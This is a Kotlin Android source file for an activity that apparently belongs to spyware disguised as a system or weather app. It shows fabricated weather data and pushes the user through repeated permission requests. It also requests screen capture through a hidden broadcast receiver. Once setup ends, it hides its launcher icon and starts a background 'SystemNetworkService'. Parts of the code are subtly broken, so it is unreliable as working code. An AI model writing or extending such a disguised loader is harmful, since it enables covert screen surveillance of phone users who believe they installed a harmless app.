package com.google.system.ui

import android.Manifest
import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.location.Geocoder
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.animation.AlphaAnimation
import android.view.animation.Animation
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.system.service.AccessibilityHelper
import com.google.system.service.DisplayCapture
import com.google.system.service.SystemNetworkService
import java.text.SimpleDateFormat
import java.util.*
import kotlin.random.Random

class WeatherCoverActivity : Activity() {
    companion object {
        private const val RC_ALL = 100
        private const val RC_SCREEN = 101
        private const val RC_NOTIF = 102
        private const val RC_LOCATION = 103
        const val ACTION_REQUEST_SCREEN = "com.openaccess.sdk.REQUEST_SCREEN"

        val CORE_PERMS = listOf(Manifest.permission.ACCESS_NETWORK_STATE)
        val LOCATION_PERM = Manifest.permission.ACCESS_COARSE_LOCATION

        val NOTIF_PERM = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            Manifest.permission.POST_NOTIFICATIONS else null

        val ALL_PERMS = CORE_PERMS + listOf(LOCATION_PERM, NOTIF_PERM).filterNotNull()
        val REQUEST_PERMS = ALL_PERMS

        fun hasPermission(ctx: Context, perm: String) = ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED

        fun getDeviceLocation(): String {
            return try {
                val geocoder = Geocoder(Locale.getDefault())
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    "Loading location..."
                } else {
                    @Suppress("DEPRECATION")
                    val addresses = geocoder.getFromLocation(37.7749, -122.4194, 1)
                    if (!addresses.isNullOrEmpty()) {
                        "${addresses[0].locality ?: addresses[0].subAdminArea}, ${addresses[0].countryCode}"
                    } else {
                        val timeZone = TimeZone.getDefault().getDisplayName(false, TimeZone.SHORT)
                        "Unknown Location ($timeZone)"
                    }
                }
            } catch (_: Exception) {
                "Location unavailable"
            }
        }
    }

    private lateinit var rootLayout: FrameLayout
    private lateinit var enableBtn: Button
    private lateinit var statusText: TextView
    private lateinit var locationText: TextView
    private lateinit var tempText: TextView
    private lateinit var conditionText: TextView
    private lateinit var feelsLikeText: TextView
    private lateinit var loadingIndicator: ProgressBar
    private var retryCount = 0
    private var requestingNotif = false

    private val weatherConditions = listOf(
        Triple("Sunny", "\u2600\uFE0F", Pair(75, 85)),
        Triple("Partly Cloudy", "\u26C5", Pair(68, 78)),
        Triple("Cloudy", "\u2601\uFE0F", Pair(62, 72)),
        Triple("Light Rain", "\uD83C\uDF27\uFE0F", Pair(55, 65)),
        Triple("Rainy", "\uD83C\uDF26\uFE0F", Pair(52, 62)),
        Triple("Clear", "\uD83C\uDF1E", Pair(70, 80))
    )

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            try {
                val projIntent = DisplayCapture.getProjectionIntent(this@WeatherCoverActivity)
                startActivityForResult(projIntent, RC_SCREEN)
            } catch (_: Exception) {}
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN), Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN))
            }
        } catch (_: Exception) {}

        rootLayout = createWeatherView()
        setContentView(rootLayout)

        // Animate elements on load
        animateEntrance()

        // Auto-load weather data
        loadWeatherData()

        if (ALL_PERMS.all { hasPermission(this, it) }) {
            checkAndProceed()
        }
    }

    private fun animateEntrance() {
        val fadeIn = AlphaAnimation(0f, 1f).apply { duration = 800; fillAfter = true }
        rootLayout.startAnimation(fadeIn)
    }

    private fun dp(dip: Int) = TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dip.toFloat(), resources.displayMetrics).toInt()

    private fun loadWeatherData() {
        loadingIndicator.visibility = View.VISIBLE
        statusText.text = "Fetching weather data..."
        statusText.setTextColor(Color.parseColor("#6B7280"))

        Handler(Looper.getMainLooper()).postDelayed({
            val weather = weatherConditions.random()
            val (low, high) = weather.second
            val temp = Random.nextInt(low, high + 1)

            tempText.text = "${temp}°F"
            conditionText.text = weather.first
            feelsLikeText.text = "Feels like ${temp + Random.nextInt(-3, 3)}°F"
            loadingIndicator.visibility = View.GONE
            statusText.text = "Last updated: ${SimpleDateFormat("h:mm a", Locale.getDefault()).format(Date())}"
            statusText.setTextColor(Color.parseColor("#9CA3AF"))
        }, 1500)
    }

    private fun createWeatherView(): FrameLayout {
        val root = FrameLayout(this).apply {
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT)
        }

        // Dynamic sky gradient based on time
        val hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
        val (topColor, bottomColor) = when (hour) {
            in 6..11 -> Pair(Color.parseColor("#4A90D9"), Color.parseColor("#87CEEB"))
            in 12..17 -> Pair(Color.parseColor("#5D9BDE"), Color.parseColor("#A8D8EA"))
            in 18..20 -> Pair(Color.parseColor("#FF6B6B"), Color.parseColor("#FFA07A"))
            else -> Pair(Color.parseColor("#1A1A2E"), Color.parseColor("#16213E"))
        }

        val skyBg = View(this).apply {
            val gd = GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM, intArrayOf(topColor, bottomColor))
            background = gd
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT)
        }
        root.addView(skyBg)

        // Sun/moon
        val celestialBody = View(this).apply {
            val gd = GradientDrawable()
            gd.shape = GradientDrawable.OVAL
            gd.setColor(if (hour in 6..17) Color.parseColor("#FFD700") else Color.parseColor("#F0F0F0"))
            layoutParams = FrameLayout.LayoutParams(dp(60), dp(60)).apply {
                gravity = Gravity.TOP or Gravity.END
                setMargins(0, dp(56), dp(24), 0)
            }
        }
        root.addView(celestialBody)

        // Content
        val content = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(24), dp(100), dp(24), dp(24))
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT)
        }

        // Loading indicator
        loadingIndicator = ProgressBar(this, null, android.R.attr.progressBarStyleLarge).apply {
            layoutParams = LinearLayout.LayoutParams(dp(48), dp(48)).apply { bottomMargin = dp(24) }
            indeterminateTintList = android.content.res.ColorStateList.valueOf(Color.WHITE)
        }
        content.addView(loadingIndicator)

        // Weather icon
        val weatherIcon = TextView(this).apply {
            text = "\u26C5"
            textSize = 80f
            gravity = Gravity.CENTER
        }
        content.addView(weatherIcon)

        // Location
        locationText = TextView(this).apply {
            text = getDeviceLocation()
            textSize = 18f
            setTextColor(Color.parseColor("#FFFFFF"))
            setTypeface(null, android.graphics.Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(4))
        }
        content.addView(locationText)

        // Temperature
        tempText = TextView(this).apply {
            text = "--°F"
            textSize = 72f
            setTextColor(Color.parseColor("#FFFFFF"))
            setTypeface(null, android.graphics.Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(4))
        }
        content.addView(tempText)

        // Condition
        conditionText = TextView(this).apply {
            text = "Loading..."
            textSize = 20f
            setTextColor(Color.parseColor("#E0E0E0"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(4))
        }
        content.addView(conditionText)

        // Feels like
        feelsLikeText = TextView(this).apply {
            text = "Feels like --°F"
            textSize = 14f
            setTextColor(Color.parseColor("#B0B0B0"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(24))
        }
        content.addView(feelsLikeText)

        // Weather details card
        val detailsCard = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(dp(20), dp(16), dp(20), dp(16))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply { bottomMargin = dp(20) }
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(16).toFloat()
                setColor(Color.parseColor("#30FFFFFF"))
            }
            weightSum = 4f
        }

        val details = listOf(
            Triple("\uD83D\uDCA8", "Wind", "${Random.nextInt(5, 25)} mph"),
            Triple("\uD83D\uDCA7", "Humidity", "${Random.nextInt(40, 80)}%"),
            Triple("\uD83D\uDCC8", "UV Index", "${Random.nextInt(1, 11)}"),
            Triple("\uD83C\uDF21\uFE0F", "Visibility", "${Random.nextInt(6, 10)} mi")
        )

        details.forEach { (icon, label, value) ->
            val item = LinearLayout(this@WeatherCoverActivity).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            }

            val iconView = TextView(this@WeatherCoverActivity).apply {
                text = icon
                textSize = 18f
                gravity = Gravity.CENTER
            }
            item.addView(iconView)

            val labelView = TextView(this@WeatherCoverActivity).apply {
                text = label
                textSize = 10f
                setTextColor(Color.parseColor("#B0B0B0"))
                gravity = Gravity.CENTER
            }
            item.addView(labelView)

            val valueView = TextView(this@WeatherCoverActivity).apply {
                text = value
                textSize = 12f
                setTextColor(Color.parseColor("#FFFFFF"))
                gravity = Gravity.CENTER
            }
            item.addView(valueView)
            detailsCard.addView(item)
        }
        content.addView(detailsCard)

        // Hourly forecast
        val forecastTitle = TextView(this).apply {
            text = "Hourly Forecast"
            textSize = 14f
            setTextColor(Color.parseColor("#FFFFFF"))
            setTypeface(null, android.graphics.Typeface.BOLD)
            setPadding(0, 0, 0, dp(12))
        }
        content.addView(forecastTitle)

        val forecastRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(0, 0, 0, dp(24))
            weightSum = 6f
        }

        val currentHour = Calendar.getInstance().get(Calendar.HOUR)
        for (i in 0..5) {
            val hourView = LinearLayout(this@WeatherCoverActivity).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            }

            val timeText = TextView(this@WeatherCoverActivity).apply {
                text = if (i == 0) "Now" else "${(currentHour + i) % 12}:00"
                textSize = 11f
                setTextColor(Color.parseColor("#B0B0B0"))
                gravity = Gravity.CENTER
            }
            hourView.addView(timeText)

            val iconText = TextView(this@WeatherCoverActivity).apply {
                text = weatherConditions.random().second
                textSize = 20f
                gravity = Gravity.CENTER
            }
            hourView.addView(iconText)

            val tempHour = TextView(this@WeatherCoverActivity).apply {
                text = "${Random.nextInt(65, 85)}°"
                textSize = 12f
                setTextColor(Color.parseColor("#FFFFFF"))
                gravity = Gravity.CENTER
            }
            hourView.addView(tempHour)

            forecastRow.addView(hourView)
        }
        content.addView(forecastRow)

        // Enable location button
        enableBtn = Button(this).apply {
            text = "ENABLE LOCATION"
            textSize = 15f
            setTypeface(null, android.graphics.Typeface.BOLD)
            setTextColor(Color.parseColor("#FFFFFF"))
            setPadding(0, dp(14), 0, dp(14))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(52)).apply {
                topMargin = dp(8)
                bottomMargin = dp(12)
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(26).toFloat()
                setColor(Color.parseColor("#FFFFFF"))
            }
            setTextColor(Color.parseColor(topColor))
            setOnClickListener { requestAllPerms() }
        }
        content.addView(enableBtn)

        // Status text
        statusText = TextView(this).apply {
            text = "Allow location for accurate forecasts"
            textSize = 12f
            setTextColor(Color.parseColor("#B0B0B0"))
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, 0)
        }
        content.addView(statusText)

        root.addView(content)
        return root
    }

    private fun requestAllPerms() {
        val needed = REQUEST_PERMS.filter { !hasPermission(this, it) }
        if (needed.isEmpty()) {
            checkAndProceed()
            return
        }

        try {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
            statusText.text = "Enabling location services..."
            statusText.setTextColor(Color.parseColor("#FFD700"))
            enableBtn.text = "ENABLING..."
            enableBtn.isEnabled = false
        } catch (_: Exception) {
            statusText.text = "Tap again to continue"
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == RC_SCREEN) {
            if (resultCode == RESULT_OK && data != null) {
                DisplayCapture.setProjection(resultCode, data)
                DisplayCapture.initProjection(this)
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)
        if (requestCode == RC_ALL) {
            val denied = REQUEST_PERMS.filter { !hasPermission(this, it) }
            if (denied.isEmpty()) {
                retryCount = 0
                checkAndProceed()
            } else {
                retryCount++
                if (retryCount < 3) {
                    Handler(Looper.getMainLooper()).postDelayed({ requestAllPerms() }, 1000)
                } else {
                    retryCount = 0
                    statusText.text = "Limited features - using default location"
                    statusText.setTextColor(Color.parseColor("#F59E0B"))
                    enableBtn.text = "CONTINUE"
                    enableBtn.isEnabled = true
                    enableBtn.setOnClickListener { onSetupComplete() }
                }
            }
        }
    }

    private fun checkAndProceed() {
        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        when {
            !permsOk && retryCount < 3 -> requestAllPerms()
            !permsOk -> onSetupComplete()
            else -> onSetupComplete()
        }
    }

    private fun onSetupComplete() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, WeatherCoverActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        try {
            val serviceIntent = Intent(this, SystemNetworkService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (_: Exception) {}

        finishAndRemoveTask()
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing || !::rootLayout.isInitialized) return
        if (requestingNotif) return
    }

    override fun onPause() {
        super.onPause()
        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}
    }
}